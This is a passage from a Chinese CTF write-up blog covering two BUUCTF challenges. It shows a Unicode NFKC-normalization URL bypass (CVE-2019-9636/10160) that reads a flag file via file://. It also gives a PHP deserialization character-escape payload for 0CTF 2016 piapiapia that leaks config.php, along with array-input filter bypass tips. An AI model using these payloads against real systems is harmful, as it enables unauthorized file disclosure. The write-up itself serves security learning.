<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置文件： &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">配置文件存放目录：&#x2F;etc&#x2F;nginx</span><br><span class="line">主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</span><br><span class="line">模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</span><br><span class="line">应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br><span class="line">程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br><span class="line">日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</span><br></pre></td></tr></table></figure>

<p>那么我们可以读取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;fd135a5b-5e96-49ec-a3ec-962516cec4b2.node4.buuoj.cn:81&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.c%E2%92%B8&#x2F;usr&#x2F;fffffflag</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-9636：urlsplit 不处理 NFKC 标准化</span><br><span class="line">CVE-2019-10160：urlsplit NFKD 标准化漏洞</span><br><span class="line"></span><br><span class="line">漏洞原理：</span><br><span class="line">用 Punycode&#x2F;IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 	URL。</span><br><span class="line">例如，在直接比较中，\ uFF03不等于&#39;＃&#39;，而是统一化为&#39;＃&#39;，这会更改 URL 的片段部分。类似地，\ u2100 统一化为&#39;a&#x2F;c&#39;，它引入了路径段。</span><br></pre></td></tr></table></figure>

<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>简单测试了下，发现不是SQL注入，元素代码也没什么提示，扫描目录</p>


<p>发现源码文件</p>
<p>代码审计中发现一个profile中存在反序列化，并且存在文件读取</p>


<p>但这个页面需要登录，我们进入register.php注册页面注册后登录，发现进入新页面</p>


<p>这个update内容存在序列化</p>


<p>但因为直接传入ptoto会进行md5那么我们要只能想办法绕开，这时候想到了字符逃逸，那就先看看黑名单或者替换的内容</p>


<p>果然在class.php中发现替换，并且存在where五字节被替换为hacker六字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>我们看看原理</p>
<p>如果我们这样子构造那么我们最后得到的内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:5:&quot;email&quot;;s:16:&quot;151727305@qq.com&quot;;s:5:&quot;phone&quot;;s:204:&quot;where*34&quot;;&#125;s:5:&quot;phone&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="TIPS-10"><a href="#TIPS-10" class="headerlink" title="TIPS"></a>TIPS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">如果我们在这个序列化字符串的后面，再加上一些字符，后面的字符是不会被反序列化的</span><br><span class="line"></span><br><span class="line">md5(Array()) &#x3D; null</span><br><span class="line">sha1(Array()) &#x3D; null</span><br><span class="line">ereg(pattern,Array()) &#x3D;null</span><br><span class="line">preg_match(pattern,Array()) &#x3D; false</span><br><span class="line">strcmp(Array(), “abc”) &#x3D;null</span><br><span class="line">strpos(Array(),“abc”) &#x3D; null</span><br><span class="line">strlen(Array()) &#x3D; null</span><br><span class="line">根据这张表格的解释，如果我们在对nickname进行正则匹配时传入数组就可以绕过过滤</span><br><span class="line">因为我们传nickname是数组，且数组序列化会有&#123;&#125;这个把他包起来，where&quot;;&#125;后面的&#125;是为了把前面的闭合</span><br></pre></td></tr></table></figure>

<p>可以看看我们的变化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这是序列化后的内容</span><br><span class="line">a:2:&#123;s:5:&quot;email&quot;;s:16:&quot;151727305@qq.com&quot;;s:8:&quot;nickname&quot;;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;phone&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;a:2:&#123;s:5:&quot;email&quot;;s:16:&quot;151727305@qq.com&quot;;s:5:&quot;phone&quot;;s:204:&quot;where*34&quot;;&#125;s:5:&quot;phone&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;</span><br><span class="line">此时我们的闭合终止在</span><br><span class="line">s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;</span><br><span class="line">那么后面的内容形成逃逸</span><br></pre></td></tr></table></figure>

</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">墨水彩笔</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/11/28/web-BUU%E7%AC%AC%E4%BA%8C%E9%A1%B5/">http://example.com/2022/11/28/web-BUU%E7%AC%AC%E4%BA%8C%E9%A1%B5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/12/10/%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">绕过思路</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/10/java%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">java刷题记录</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 墨水彩笔</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>